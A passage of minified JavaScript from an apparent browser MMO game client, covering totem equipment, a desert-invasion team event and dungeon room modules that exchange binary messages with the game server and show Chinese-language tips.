d.TipsCT.ins().showTips(gettext("玩法结算重置中")),!1}return!0},e.prototype.clearInfo=function(){this.isSixReis=!1,this.sixBasePos=[],this.sixBaseMap=[]},__decorate([post()],e.prototype,"postSetTeamInfo",null),__decorate([post()],e.prototype,"exitTeamBack",null),__decorate([delayCall(1500)],e.prototype,"isGoCity",null),__decorate([post()],e.prototype,"doReturnUnlockPos",null),__decorate([post()],e.prototype,"psetPlayerBaseInfo",null),__decorate([post()],e.prototype,"postReturnPosInfo",null),__decorate([post()],e.prototype,"selectValue",null),__decorate([post()],e.prototype,"updateMap",null),e}(o.BaseSystem);e.SixReisCT=g,window.SixReisCT=g,__reflect(g.prototype,"SixReisCT",[]),Systemap.SixReisCT=function(){return g.ins()},window.SixReisCT=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemCT=void 0;var n=i(14),o=i(17),s=i(0),a=i(39),r=i(180),l=i(15),h=i(4),u=i(13),p=i(6),d=i(10),c=i(12),f=i(158),g=i(2),m=function(t){function e(){var e=t.call(this)||this;return e.TotemIdArr=[],e.totemAllRed=new o.RedPoint,e.descomposeList=[],e.skillLevel=1,e.old=1,e.skillMaxLv=6,e.baizeCDidx=0,e.totemSkillAuto=!0,e.isTotemOpen=0,e.TotemSkillIDMin=4e6,e.TotemSkillIDMax=5e6,e.TotemItemIDMin=21e4,e.TotemItemIDMax=22e4,e.sysId=PackageID.Totem,e.regNetMsg(1,e.doTotemData),e.regNetMsg(2,e.doTotemDataArr),e.regNetMsg(3,e.doTotemDataOutArr),e.regNetMsg(4,e.doComposeTotemItem),e.initRed(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRed=function(){this.totemAllRed=new o.RedPoint(function(){if(!c.OpenSystem.ins().checkSysOpen(l.SystemType.Totem))return!1;if(!p.BagCT.ins().bagModel)return!1;var t=p.BagCT.ins().bagModel[p.BagCT.BAG_TYPE_OTHTER];if(!t)return!1;for(var i=0;i<t.length;i++){var n=t[i];if(d.ItemUtil.getType(n.itemConfig)==a.ItemType.TYPE_56){var o=n.itemConfig,s=e.ins().checkTotemJob(o.id);if(s){if(!e.ins().checkIsWear(o.id))return!0;if(!e.ins().returnIsWearSmallerType(o.id))return!0;if(!e.ins().returnIsLowerQualityComItem(o.id))return!0}}}return!1},p.BagCT.ins().postItemChange,p.BagCT.ins().postItemAdd,p.BagCT.ins().postItemDel,this.doTotemDataArr,this.doTotemDataOutArr,this.updateTotemItem)},e.prototype.updateBaizzCDIdx=function(){this.baizeCDidx=0;for(var t=s.GlobalConfig.TotemUnitConfig[4],i=s.GlobalConfig.TotemConfig,n=s.GlobalConfig.TotemAuxiliarySuitConfig,o=t.iconRes,a=t.qualityNum[1],l=[],u=1;10*a>u;u++){var p=i[o+u];p&&l.push(i[o+u])}for(var d=e.ins().returnTotemTypeDataByArr(l,4),c=t.suitPart[t.suitPart.length-1],f=0;f<d.length;f++)if(d[f].count==c)switch(h.ActorCC.jobId){case r.JobConst.ZhanShi:this.baizeCDidx=n[4][c][d[f].quality].revise_1;break;case r.JobConst.FaShi:this.baizeCDidx=n[4][c][d[f].quality].revise_2;break;case r.JobConst.DaoShi:this.baizeCDidx=n[4][c][d[f].quality].revise_3;break;case r.JobConst.CiKe:this.baizeCDidx=n[4][c][d[f].quality].revise_4;break;case r.JobConst.GongShou:this.baizeCDidx=n[4][c][d[f].quality].revise_5}},e.prototype.returnTotemSkillCD=function(t){return t>=this.TotemSkillIDMin&&t<this.TotemSkillIDMax&&this.baizeCDidx>0?s.GlobalConfig.TotemReviseConfig[this.baizeCDidx].cd:0},e.prototype.doTotemData=function(t){var e=t.readInt();this.TotemIdArr=[];for(var i=0;e>i;i++){var n=t.readInt();this.TotemIdArr.push(n)}this.AddSkill(!0),this.updateTotemItem(),this.updateBaizzCDIdx()},e.prototype.sendMergeItem=function(t){var e=this.getBytes(2);e.writeInt(t),this.sendToServer(e)},e.prototype.doTotemDataArr=function(t){var e=t.readInt();this.judgeTotemSmaller(e),this.updateTotemItem(),this.AddSkill(!0),this.updateBaizzCDIdx()},e.prototype.sendOutItem=function(t){var e=this.getBytes(3);e.writeInt(t),this.sendToServer(e)},e.prototype.doTotemDataOutArr=function(t){var e=t.readInt();this.judgeOutTotemItem(e),this.updateTotemItem(),this.AddSkill(!1),this.updateBaizzCDIdx()},e.prototype.updateTotemItem=function(){},e.prototype.sendComposeItem=function(t,e){var i=this.getBytes(4);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.doComposeTotemItem=function(t){var e=t.readByte();1==e&&g.TipsCT.ins().showTips(gettext("合成成功"));t.readInt()},e.prototype.judgeOutTotemItem=function(t){for(var e=[],i=0;i<this.TotemIdArr.length;i++)this.TotemIdArr[i]!=t&&e.push(this.TotemIdArr[i]);this.TotemIdArr=[];for(var n=0;n<e.length;n++)this.TotemIdArr.push(e[n])},e.prototype.judgeTotemSmaller=function(t){for(var e=!1,i=0;i<this.TotemIdArr.length;i++){var n=this.TotemIdArr[i]%1e3,o=t%1e3;Math.floor(n/100)==Math.floor(o/100)&&Number(this.TotemIdArr[i])%10==t%10&&(this.TotemIdArr[i]=t,e=!0)}e||this.TotemIdArr.push(t)},e.prototype.judgeTotemQuality=function(t){for(var e=s.GlobalConfig.ItemConfig,i=s.GlobalConfig.ItemDescConfig,n=0;n<this.TotemIdArr.length;n++){var o=this.TotemIdArr[n]%1e3,a=t%1e3;if(Math.floor(o/100)==Math.floor(a/100)&&Number(this.TotemIdArr[n])%10==t%10){var r=e[this.TotemIdArr[n]].descIndex,l=i[r];if(l)return l.quality}}return 0},e.prototype.getCurPosTotem=function(t,e){void 0===e&&(e=1);var i=p.BagCT.ins().getBagGoodsByType(a.ItemType.TYPE_56),n=s.GlobalConfig.TotemConfig,o=[];for(var r in i){var l=n[i[r].configID];l.pos==t&&l.group==e&&o.push(i[r])}return o.sort(this.sort),o},e.prototype.sort=function(t,e){return t.quality<e.quality?1:t.quality>e.quality?-1:0},e.prototype.returnPower=function(t){for(var i=0,n=s.GlobalConfig.TotemConfig,o=0;o<this.TotemIdArr.length;o++){var a=this.TotemIdArr[o]%1e3,r=t%1e3;if(Math.floor(a/100)==Math.floor(r/100)){var l=n[this.TotemIdArr[o]].attr;e.ins().setAttrValue(l),i+=d.ItemUtil.getAttrPower(l)}}return i},e.prototype.returnAttr=function(t){for(var e=[],i=s.GlobalConfig.TotemConfig,n=0;n<this.TotemIdArr.length;n++){var o=this.TotemIdArr[n]%1e3,a=t%1e3;if(Math.floor(o/100)==Math.floor(a/100))for(var r=i[this.TotemIdArr[n]].attr,l=0;l<r.length;l++)if(this.returnIsHasType(r[l],e))for(var h=0;h<e.length;h++)e[h].type==r[l].type&&(e[h].value+=r[l].value);else e.push({type:r[l].type,value:r[l].value})}return e},e.prototype.returnIsHasType=function(t,e){for(var i=0;i<e.length;i++)if(e[i].type==t.type)return!0;return!1},e.prototype.checkIsWear=function(t){for(var e=0;e<this.TotemIdArr.length;e++){var i=this.TotemIdArr[e]%1e3,n=t%1e3;if(Math.floor(i/100)==Math.floor(n/100))return!0}return!1},e.prototype.checkIsWearDone=function(t,e){void 0===e&&(e=0);for(var i=0,n=0;n<this.TotemIdArr.length;n++){var o=this.TotemIdArr[n]%1e3,a=t%1e3;Math.floor(o/100)==Math.floor(a/100)&&i++}var r=s.GlobalConfig.TotemUnitConfig[e].partNum;return i==r?!0:!1},e.prototype.checkIsWearMax=function(t,e,i){void 0===e&&(e=0);for(var n=0,o=0;o<this.TotemIdArr.length;o++){var a=this.TotemIdArr[o]%1e3,r=t%1e3;Math.floor(a/100)==Math.floor(r/100)&&Math.floor(this.TotemIdArr[o]%100/10)+1==i&&n++}var l=s.GlobalConfig.TotemUnitConfig[e].partNum;return n==l?!0:!1},e.prototype.checkIsWearLevel=function(t,e,i){void 0===e&&(e=0),void 0===i&&(i=6);for(var n=i,o=0;o<this.TotemIdArr.length;o++){var s=this.TotemIdArr[o]%1e3,a=t%1e3;Math.floor(s/100)==Math.floor(a/100)&&Math.floor(this.TotemIdArr[o]%100/10)+1<n&&(n=Math.floor(this.TotemIdArr[o]%100/10)+1)}return n},e.prototype.checkCanWear=function(t){for(var e=s.GlobalConfig.TotemConfig,i=e[t].pos,n=0;n<this.TotemIdArr.length;n++){var o=this.TotemIdArr[n]%1e3,a=t%1e3;if(Math.floor(o/100)==Math.floor(a/100)){var r=e[this.TotemIdArr[n]].pos;if(i==r)return!1}}return!0},e.prototype.checkTotemJob=function(t){var e,i=s.GlobalConfig.TotemConfig,n=i[t].group,o=s.GlobalConfig.TotemUnitConfig;if(o){if(null===(e=o[n])||void 0===e?!0:!e.job)return!0;if(o[n].job==h.ActorCC.jobId)return!0}return!1},e.prototype.AddSkill=function(t){var i,n,o=e.ins().returnGropByJob();if(0!=o){var a=Number(s.GlobalConfig.TotemUnitConfig[o].iconRes);if(t){if(this.checkIsWearDone(a,o)){var r=this.skillMaxLv,l=this.checkIsWearLevel(a,o,r),h=null===(i=s.GlobalConfig.TotemMainSkillConfig[o][l])||void 0===i?void 0:i.skillId;if(h){var p=u.SubRoles.ins().roles[0];if(p.skillsData.length>7){if(!this.returnIsHasSkillById(h)){p.skillsData.pop();var d=new f.SkillData(h,l);d.autoUse=this.totemSkillAuto,p.skillsData.push(d)}}else{var d=new f.SkillData(h,l);d.autoUse=this.totemSkillAuto,p.skillsData.push(d)}}}}else if(!this.checkIsWearDone(a,o)){var r=this.skillMaxLv,l=this.checkIsWearLevel(a,o,r),h=null===(n=s.GlobalConfig.TotemMainSkillConfig[o][l])||void 0===n?void 0:n.skillId;if(h){var p=u.SubRoles.ins().roles[0];p.skillsData.length>7&&p.skillsData.pop()}}}},e.prototype.returnIsHasSkillById=function(t){for(var e=u.SubRoles.ins().roles[0],i=0;i<e.skillsData.length;i++)if(e.skillsData[i].config&&e.skillsData[i].config.id==t)return!0;return!1},e.prototype.returnItemIdByItemId=function(t){for(var e=0;e<this.TotemIdArr.length;e++){var i=this.TotemIdArr[e]%1e3,n=t%1e3;if(Math.floor(i/100)==Math.floor(n/100)&&Number(this.TotemIdArr[e])%10==t%10)return this.TotemIdArr[e]}return t},e.prototype.returnIsWearByItemId=function(t){for(var e=0;e<this.TotemIdArr.length;e++)if(t==this.TotemIdArr[e])return!0;return!1},e.prototype.returnTotemEquipCount=function(t){for(var e=0,i=0;i<t.length;i++)for(var n=0;n<this.TotemIdArr.length;n++)t[i].id==this.TotemIdArr[n]&&e++;return e},e.prototype.returnIsWearSmallerType=function(t){for(var e=0;e<this.TotemIdArr.length;e++){var i=this.TotemIdArr[e]%1e3,n=t%1e3;if(Math.floor(i/100)==Math.floor(n/100)&&Number(this.TotemIdArr[e])%10==t%10)return!0}return!1},e.prototype.returnIsLowerQualityComItem=function(t){for(var e=s.GlobalConfig.TotemConfig,i=0;i<this.TotemIdArr.length;i++){var n=this.TotemIdArr[i]%1e3,o=t%1e3;if(Math.floor(n/100)==Math.floor(o/100)&&Number(this.TotemIdArr[i])%10==t%10){var a=e[this.TotemIdArr[i]].quality,r=e[t].quality;if(a>=r)return!0}}return!1},e.prototype.getTotemItemList=function(){var t=[],e=p.BagCT.ins().bagModel[0];if(e&&e.length>0)for(var i=0;i<e.length;i++)e[i].configID>this.TotemItemIDMin&&e[i].configID<this.TotemItemIDMax&&t.push(e[i]);return t},e.prototype.returnItemTypeCountByItemId=function(t){for(var e=0,i=0;i<this.TotemIdArr.length;i++){var n=this.TotemIdArr[i]%1e3,o=t%1e3;Math.floor(n/100)==Math.floor(o/100)&&Math.floor(Number(this.TotemIdArr[i])/10)==Math.floor(t/10)&&e++}return e},e.prototype.returnTotemTypeDataByArr=function(t,e){void 0===e&&(e=0);var i,n=s.GlobalConfig.TotemUnitConfig;0!=e&&(i=n[e].suitPart);for(var o=[],a=0;a<t.length;a++)for(var r=0;r<this.TotemIdArr.length;r++)t[a].id==this.TotemIdArr[r]&&o.push(t[a].quality);return this.setDataValue(o,i)},e.prototype.setDataValue=function(t,e){for(var i=[],n=2;10>n;){for(var o=t[t.length-n],s=0;s<e.length;s++)if(n==e[s]&&o){var a={count:n,quality:o};i.push(a)}n++}return i},e.prototype.isRedByTotemType=function(t){if(!p.BagCT.ins().bagModel)return!1;var i=p.BagCT.ins().bagModel[p.BagCT.BAG_TYPE_OTHTER];if(!i)return!1;for(var n=0;n<i.length;n++){var o=i[n];if(d.ItemUtil.getType(o.itemConfig)==a.ItemType.TYPE_56){var s=o.itemConfig;if(this.returnGroupById(t)==this.returnGroupById(s.id)){var r=e.ins().checkTotemJob(s.id);if(r){if(!e.ins().checkIsWear(s.id))return!0;if(!e.ins().returnIsWearSmallerType(s.id))return!0;if(!e.ins().returnIsLowerQualityComItem(s.id))return!0}}}}return!1},e.prototype.returnRedByTotemTypeArr=function(t){var i=[];if(!p.BagCT.ins().bagModel)return i;var n=p.BagCT.ins().bagModel[p.BagCT.BAG_TYPE_OTHTER];if(!n)return i;for(var o=0;o<n.length;o++){var s=n[o];if(d.ItemUtil.getType(s.itemConfig)==a.ItemType.TYPE_56){var r=s.itemConfig;if(this.returnGroupById(t)==this.returnGroupById(r.id)){var l=e.ins().checkTotemJob(r.id);l&&(e.ins().checkIsWear(r.id)&&e.ins().returnIsWearSmallerType(r.id)?e.ins().returnIsLowerQualityComItem(r.id)||i.push(r.id):i.push(r.id))}}}return i},e.prototype.returnGroupById=function(t){return s.GlobalConfig.TotemConfig[t].group},e.prototype.setAttrValue=function(t,e,i){if(void 0===e&&(e=!1),void 0===i&&(i=1),e){for(var n=0;n<t.length;n++)if(141==t[n].type||142==t[n].type)switch(i){case 2:t[n].type+=4*(i-1);break;case 3:t[n].type+=2*(i-2)}}else for(var n=0;n<t.length;n++)if(141==t[n].type||142==t[n].type)switch(h.ActorCC.jobId){case 2:t[n].type+=4*(h.ActorCC.jobId-1);break;case 3:t[n].type+=2*(h.ActorCC.jobId-2)}},e.prototype.isTotem=function(t){var e=s.GlobalConfig.ItemConfig[t];return e&&e.descIndex>=210&&e.descIndex<=216?!0:!1},e.prototype.returnTotemConfig=function(t,e){var i=s.GlobalConfig.TotemConfig;if(i)for(var n in i)if(i[n].group==e&&i[n].pos==t)return i[n];return null},e.prototype.returnGropByJob=function(){var t=h.ActorCC.jobId,e=s.GlobalConfig.TotemUnitConfig;if(e)for(var i in e)if(e[i].job&&e[i].job==t)return e[i].group;return 1},__decorate([post()],e.prototype,"doTotemDataArr",null),__decorate([post()],e.prototype,"doTotemDataOutArr",null),__decorate([post()],e.prototype,"updateTotemItem",null),e}(n.BaseSystem);e.TotemCT=m,window.TotemCT=m,__reflect(m.prototype,"TotemCT",[]),Systemap.TotemCT=function(){return m.ins()},window.TotemCT=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataBase=void 0;var n=i(71),o=function(){function t(){}return t.prototype.parser=function(t,e){var i=this;e.forEach(function(e){i[e]=t[n.RankDataType.readFunc[e]]()})},t}();e.RankDataBase=o,window.RankDataBase=o,__reflect(o.prototype,"RankDataBase",[]),window.RankDataBase=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeCT=void 0;var n=i(8),o=i(135),s=i(14),a=i(0),r=i(15),l=i(4),h=i(20),u=i(58),p=i(45),d=i(12),c=i(7),f=i(2),g=i(235),m=function(t){function e(){var e=t.call(this)||this;return e.tarSerId=0,e.startTime=0,e.bolOpen=!1,e.signEndTime=0,e.roundEndTime=0,e.nextCanInviteTime=0,e._remainTime=0,e.invadeBaseDatas=[],e.invadeTeamBaseId=0,e.invadeTeamDatas=[],e.weekTimeStamp=[],e.fightPhase=0,e.myScore=0,e.myScoreDic={},e.otherScore=0,e.otherScoreDic={},e.myWins=0,e.otherWins=0,e.myCampId=0,e.sysId=PackageID.Invade,e.regNetMsg(1,e.postInvadeActInfo),e.regNetMsg(2,e.doInvadeBaseAllDataArr),e.regNetMsg(3,e.doInvadeBaseDataArr),e.regNetMsg(4,e.postGetAllFightInfo),e.regNetMsg(5,e.doGetTeamInfo),e.regNetMsg(6,e.doGetQuitTeam),e.regNetMsg(9,e.doGetJoinTeam),e.regNetMsg(10,e.doGetInvite),e.regNetMsg(11,e.doGetInviteInfo),observe(e,e.initWeekTimeStamps,o.GameApp.ins().postZeroInit),e}return __extends(e,t),e.prototype.initInvadeInfo=function(){this.invadeBaseDatas=[];var t=a.GlobalConfig.DesertInvasionNodeConfig;for(var e in t){var i={id:Number(e),winsArr:[0,0,0],lastLeaderName:"",lastSerId:0,teamArr:[]};this.invadeBaseDatas.push(i)}},e.prototype.initTeamDatas=function(){this.invadeTeamDatas=[]},e.ins=function(){return t.ins.call(this)},e.prototype.clearData=function(){this.invadeTeamDatas=[],this.invadeTeamBaseId=0,this.myCampId=0},e.prototype.postInvadeActInfo=function(t){this.bolOpen=t.readBoolean(),this.tarSerId=t.readInt();var e=t.readUnsignedInt();this.startTime=n.DateUtils.formatMiniDateTime(e),this.clearData(),this.initPhaseByStartTime(),this.initWeekTimeStamps()},e.prototype.postInvadeInfoUpdate=function(){},e.prototype.postInvadeTeamUpdate=function(){},e.prototype.sendGetAllInvadeBase=function(){var t=this.getBytes(2);this.sendToServer(t)},e.prototype.doInvadeBaseAllDataArr=function(t){this.invadeBaseDatas.length||this.initInvadeInfo();for(var e=t.readUnsignedShort(),i=0;e>i;i++){for(var n={id:t.readUnsignedShort(),winsArr:[0,0,0],lastLeaderName:"",lastSerId:0,teamArr:[]},o=t.readUnsignedByte(),s=0;o>s;s++)n.winsArr[s]=t.readByte();for(var a in this.invadeBaseDatas)if(n.id==this.invadeBaseDatas[a].id){this.invadeBaseDatas[a]=n;break}}this.postInvadeInfoUpdate()},e.prototype.sendGetInvadeBase=function(t){var e=this.getBytes(3);e.writeUnsignedShort(t),this.sendToServer(e)},e.prototype.doInvadeBaseDataArr=function(t){for(var e,i=t.readUnsignedShort(),n=0,o=this.invadeBaseDatas;n<o.length;n++){var s=o[n];if(s.id==i){e=s;break}}if(!e)return void this.postInvadeInfoUpdate();e.lastLeaderName=t.readString(),e.lastSerId=t.readInt(),e.teamArr=[];for(var a=t.readUnsignedByte(),r=0;a>r;r++){var s={id:t.readInt(),isLeader:t.readByte(),name:t.readString(),job:t.readByte(),title:t.readInt(),outward:t.readInt(),power:t.readDouble(),level:t.readUnsignedShort()};e.teamArr.push(s)}this.postInvadeInfoUpdate()},e.prototype.sendGetAllFightInfo=function(){var t=this.getBytes(4);this.sendToServer(t)},e.prototype.postGetAllFightInfo=function(t){this.myScoreDic={},this.otherScoreDic={},this.myScore=0,this.otherScore=0;for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readInt();this.myScoreDic[n]=o,this.myScore+=o}e=t.readUnsignedByte();for(var i=0;e>i;i++){var n=t.readByte(),o=t.readInt();this.otherScoreDic[n]=o,this.otherScore+=o}this.myWins=t.readUnsignedShort(),this.otherWins=t.readUnsignedShort()},e.prototype.sendCreateTeam=function(){var t=this.getBytes(5);this.sendToServer(t)},e.prototype.doGetTeamInfo=function(t){this.invadeTeamDatas=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n={id:t.readInt(),isLeader:t.readByte(),name:t.readString(),job:t.readByte(),title:t.readInt(),outward:t.readInt(),power:t.readDouble(),level:t.readUnsignedShort()};this.invadeTeamDatas.push(n)}this.invadeTeamBaseId=t.readUnsignedShort(),this.postInvadeTeamUpdate()},e.prototype.sendQuitTeam=function(){var t=this.getBytes(6);this.sendToServer(t)},e.prototype.doGetQuitTeam=function(t){var e=t.readByte();switch(e){case 1:f.TipsCT.ins().showTips(gettext("退出队伍成功！"))}this.invadeTeamDatas.length=0,this.postInvadeTeamUpdate(),win.close("InvadeTeamRoomWin")},e.prototype.sendOutTeam=function(t){var e=this.getBytes(7);e.writeInt(t),this.sendToServer(e)},e.prototype.sendJoin=function(t){var e=this.getBytes(8);e.writeUnsignedShort(t),this.sendToServer(e)},e.prototype.sendJoinTeam=function(t){var e=this.getBytes(9);e.writeInt(t),this.sendToServer(e)},e.prototype.doGetJoinTeam=function(t){var e=t.readByte();switch(e){case 1:win.open(g.InvadeTeamRoomWin);break;case 2:f.TipsCT.ins().showTips(gettext("无队伍"));break;case 3:f.TipsCT.ins().showTips(gettext("队伍已满"));break;case 4:f.TipsCT.ins().showTips(gettext("已报名"))}},e.prototype.sendInvite=function(){var t=this.getBytes(10);this.sendToServer(t)},e.prototype.doGetInvite=function(t){var e=t.readString(),i=t.readString(),n=u.LangUtils.analysis(e,i);p.ChatCT.ins().createNewChatMsg(n,0,e,!0)},e.prototype.doGetInviteInfo=function(t){this.nextCanInviteTime=n.DateUtils.formatMiniDateTime(t.readInt()),console.log("106-11下次可邀请时间",this.nextCanInviteTime)},e.prototype.sendTeamInfo=function(){var t=this.getBytes(12);this.sendToServer(t)},e.prototype.checkMeIsLeader=function(){if(!this.invadeTeamDatas||!this.invadeTeamDatas.length)return!1;for(var t=0,e=this.invadeTeamDatas;t<e.length;t++){var i=e[t];if(1==i.isLeader&&i.id==l.ActorCC.actorID)return!0}return!1},e.prototype.checkIsTeamer=function(t){if(!this.invadeTeamDatas||!this.invadeTeamDatas.length)return!1;for(var e=0,i=this.invadeTeamDatas;e<i.length;e++){var n=i[e];if(n.id==t)return!0}return!1},e.prototype.checkCanInvite=function(){return c.GameServerCC.serverTime-this.nextCanInviteTime>0},e.prototype.checkIsFriend=function(t){return h.GameMap.checkIsInInvade()&&this.myCampId==t},e.prototype.initWeekTimeStamps=function(t,e,i){t=t?t:a.GlobalConfig.DesertInvasionBaseConfig.weekopentime;var n=c.GameServerCC.isInOtherPlayTime()?a.GlobalConfig.DesertInvasionBaseConfig.dayopentime2:a.GlobalConfig.DesertInvasionBaseConfig.dayopentime;e=e?e:n,i=i?i:c.GameServerCC.serverTime;var o=t.split(",").map(Number);0==o[1]&&(o[1]=7);var s=e.split(":").map(Number),r=s[0],l=s[1],h=new Date(i),u=h.getDay();0==u&&(u=7),h.setHours(r,l,0,0);for(var p=a.GlobalConfig.DesertInvasionBaseConfig.signUpTime,d=a.GlobalConfig.DesertInvasionBaseConfig.battleTime,f=a.GlobalConfig.DesertInvasionBaseConfig.rounds,g=p+d,m=[],v=1;7>=v;v++)if(v>=o[0]&&v<=o[1]){var y={weekDay:v,startTime:0,endTime:0,roundsTime:[]};y.startTime=h.getTime()+24*(v-u)*60*60*1e3,y.endTime=y.startTime+g*f*1e3;for(var C=0;f>C;C++){var T=y.startTime+C*g*1e3+1e3*p;y.roundsTime.push([T,T+1e3*d])}m[v]=y}return this.weekTimeStamp=m,m},e.prototype.getPhaseByTime=function(t){var e,i=new Date(t),n=i.getDay();0==n&&(n=7);var o=this.weekTimeStamp[n];if(!this.bolOpen&&!o)return this.fightPhase=3,[this.fightPhase,-1];var s=(null!==(e=null===o||void 0===o?void 0:o.roundsTime)&&void 0!==e?e:0,0),a=0;if(this.signEndTime>t)s=1,a=this.signEndTime-t;else if(this.roundEndTime>t)s=2,a=this.roundEndTime-t;else{if(!o)return[this.fightPhase,-1];if(t<o.startTime)s=0,a=o.startTime-t;else if(t>o.endTime){var r=this.weekTimeStamp[n+1];if(!r)return this.fightPhase=3,[this.fightPhase,-1];s=0,a=r.startTime-t}}return this.fightPhase=s,[this.fightPhase,a]},e.prototype.initPhaseByStartTime=function(){if(!this.bolOpen||!this.startTime)return void(this.signEndTime=this.roundEndTime=0);var t=a.GlobalConfig.DesertInvasionBaseConfig.signUpTime,e=a.GlobalConfig.DesertInvasionBaseConfig.battleTime;this.signEndTime=this.startTime+1e3*t,this.roundEndTime=this.startTime+1e3*(t+e)},e.prototype.getTeamPower=function(){for(var t=0,e=0,i=this.invadeTeamDatas;e<i.length;e++){var n=i[e];t+=n.power}return t},e.prototype.checkShowEnter=function(){return d.OpenSystem.ins().checkSysOpen(r.SystemType.Invade)&&this.bolOpen?!0:!1},Object.defineProperty(e.prototype,"remainTime",{get:function(){return this._remainTime},set:function(t){this._remainTime!=t&&(this._remainTime=t,Timer.stop(this.downTime,this),Timer.start(1e3,this._remainTime,this.downTime,this))},enumerable:!1,configurable:!0}),e.prototype.downTime=function(){this._remainTime-=1,this._remainTime<=0},__decorate([post()],e.prototype,"postInvadeActInfo",null),__decorate([post()],e.prototype,"postInvadeInfoUpdate",null),__decorate([post()],e.prototype,"postInvadeTeamUpdate",null),__decorate([post()],e.prototype,"postGetAllFightInfo",null),e}(s.BaseSystem);e.InvadeCT=m,window.InvadeCT=m,__reflect(m.prototype,"InvadeCT",[]),Systemap.InvadeCT=function(){return m.ins()},window.InvadeCT=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainMemberVo=e.StardomainRoomInfo=e.StardomainCT=void 0;var n=i(14),o=i(0),s=i(4),a=i(20),r=i(45),l=i(7),h=i(2),u=i(191),p=function(t){function e(){var e=t.call(this)||this;return e.monsterInfoDic={},e._roomId=0,e.nextCanInviteTime=0,e.curSelId=0,e.sysId=PackageID.Guanqia,e.regNetMsg(120,e.buildRoomBack),e.regNetMsg(121,e.roomMemberInfoBack),e.regNetMsg(122,e.enterRoomBack),e.regNetMsg(123,e.exitRoomBack),e.regNetMsg(124,e.postEnterStardomain),e.regNetMsg(128,e.myInfoBack),e.regNetMsg(129,e.invitePlayerBack),e.regNetMsg(130,e.bossInfoBack),e.regNetMsg(131,e.sceneBuffInfoBack),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},Object.defineProperty(e.prototype,"roomId",{get:function(){return this._roomId},set:function(t){this._roomId=t,this.postRoomChange()},enumerable:!1,configurable:!0}),e.prototype.postRoomChange=function(){},e.prototype.postOpenInviteView=function(){},e.prototype.postShowFightWin=function(){},e.prototype.checkIsFriend=function(t){return this.roomId==t},e.prototype.reqBuildRoom=function(t){var e=this.getBytes(120);e.writeByte(t),this.sendToServer(e)},e.prototype.buildRoomBack=function(t){this.roomId=t.readDouble()},e.prototype.roomMemberInfoBack=function(t){this.roomInfo=new d,this.roomInfo.parse(t),this.roomId=this.roomInfo.roomId},e.prototype.reqEnterRoom=function(t){var e=this.getBytes(122);e.writeDouble(t),this.sendToServer(e)},e.prototype.enterRoomBack=function(t){var e=t.readByte();if(0==e)this.roomId=t.readDouble(),win.open(u.StardomainRoomView);else switch(e){case 2:h.TipsCT.ins().showTips(gettext("在副本内，不能进入"));break;case 3:h.TipsCT.ins().showTips(gettext("已经在别的房间"));break;case 4:h.TipsCT.ins().showTips(gettext("要进入的房间不存在"));break;case 7:h.TipsCT.ins().showTips(gettext("房间已经满人"))}},e.prototype.reqExitRoom=function(){var t=this.getBytes(123);this.sendToServer(t)},e.prototype.exitRoomBack=function(t){var e=t.readByte();switch(e){case 1:h.TipsCT.ins().showTips(gettext("退出队伍成功！"));break;case 2:h.TipsCT.ins().showTips(gettext("@_@你被踢出了队伍！"));break;case 3:h.TipsCT.ins().showTips(gettext("队长解散了队伍！"))}this.roomId=0,this.roomInfo=null,win.close(u.StardomainRoomView)},e.prototype.reqEnterStardomain=function(t){var e=this.getBytes(124);e.writeByte(t),this.sendToServer(e)},e.prototype.postEnterStardomain=function(t){var e=t.readByte();switch(e){case 1:h.TipsCT.ins().showTips(gettext("进入副本失败"));break;case 2:h.TipsCT.ins().showTips(gettext("冷却时间CD中"));break;case 3:h.TipsCT.ins().showTips(gettext("创建副本失败"))}},e.prototype.reqKickoutMember=function(t){var e=this.getBytes(125);e.writeInt(t),this.sendToServer(e)},e.prototype.reqLookTeamInfo=function(){var t=this.getBytes(126);this.sendToServer(t)},e.prototype.reqSwitchMap=function(t){var e=this.getBytes(127);e.writeInt(t),this.sendToServer(e)},e.prototype.myInfoBack=function(t){this.roomId=t.readDouble(),this.assistCount=t.readByte(),this.reqLookTeamInfo()},e.prototype.reqInvitePlayer=function(t){var e=this.getBytes(129);e.writeString(t),this.sendToServer(e);var i=o.GlobalConfig.StarDomainBaseConfig.inviteCd,n=1e3*i+l.GameServerCC.serverTime;this.nextCanInviteTime=n},e.prototype.invitePlayerBack=function(t){var e=t.readString();r.ChatCT.ins().createNewChatMsg(e,0,"",!0)},e.prototype.reqBossInfo=function(){var t=this.getBytes(130);this.sendToServer(t)},e.prototype.bossInfoBack=function(t){var e=t.readUnsignedByte();this.bossInfoDic={};for(var i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readInt(),s=t.readShort();this.bossInfoDic[n]={time:o,buffId:s}}},e.prototype.sceneBuffInfoBack=function(t){var e=t.readShort(),i=t.readInt();this.sceneBuff={buffId:e,value:i}},e.prototype.checkCanInvite=function(){return l.GameServerCC.serverTime-this.nextCanInviteTime>0},e.prototype.checkShowEnter=function(){return this.roomId>0&&!a.GameMap.checkIsInStardomain()},e.prototype.getMonsterInfoList=function(t){return this.monsterInfoDic[t]||this.initMonster(t),this.monsterInfoDic[t]||[]},e.prototype.initMonster=function(t){if(!this.monsterInfoDic[t]){var e=this.monsterInfoDic[t]=[],i=o.GlobalConfig.StarDomainBossConfig;for(var n in i){var s=i[n];if(s.type==t&&s.clientPos){var a={id:s.id,type:s.type,monsterId:s.clientPos.monId,x:s.clientPos.posX,y:s.clientPos.posY,cfg:s};e.push(a)}}}},e.prototype.checkMeIsLeader=function(){if(!this.roomInfo||!this.roomInfo.members||0==this.roomInfo.members.length)return!1;for(var t=0,e=this.roomInfo.members;t<e.length;t++){var i=e[t];if(1==i.leaderStatus&&i.roleId==s.ActorCC.actorID)return!0}return!1},e.prototype.stardomainFbIsGoing=function(){if(!this.roomInfo||!this.roomInfo.members||0==this.roomInfo.members.length)return!1;for(var t=0,e=this.roomInfo.members;t<e.length;t++){var 